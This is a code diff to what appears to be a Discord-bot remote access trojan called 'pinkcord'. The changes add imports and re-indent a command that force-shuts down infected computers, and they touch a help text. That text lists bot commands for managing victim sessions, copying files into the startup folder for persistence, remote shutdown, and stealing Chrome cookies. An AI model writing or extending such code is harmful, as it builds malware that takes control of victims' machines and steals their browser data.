@@ -14,6 +14,9 @@ from Cryptodome.Cipher import AES
 from keyboard import read_event
 from subprocess import call
 from zipfile import ZipFile
+import random
+import shutil
+import pyperclip
 
 while True:
     try:
@@ -375,12 +378,12 @@ while True:
                 sesja = nowaSesja
 
         @bot.command()
-async def shutdown(ctx, session):
-    if session == "all":
-        os.system("shutdown /s /f /t 1")
-    else:
-        if session == sesja:
-            os.system("shutdown /s /f /t 1")
+        async def shutdown(ctx, session):
+            if session == "all":
+                os.system("shutdown /s /f /t 1")
+            else:
+                if session == sesja:
+                    os.system("shutdown /s /f /t 1")
         
         @bot.command()
         async def h(ctx):
@@ -405,7 +408,7 @@ async def shutdown(ctx, session):
 !sessions - Displays all sessions.
 !rename [session] [new_name] - Changes the name of a session.
 !startup [session] [file path] - copy file to startup folder (you can copy pinkcord exe file)
-!shutdown [session] - Shut down the remote computer.
+!shutdown [session] - Shutdown the remote computer.
 !chrome [session] [action(cookie)] - steals selected data from chrome
             '''
             await ctx.send(wiadomosc)
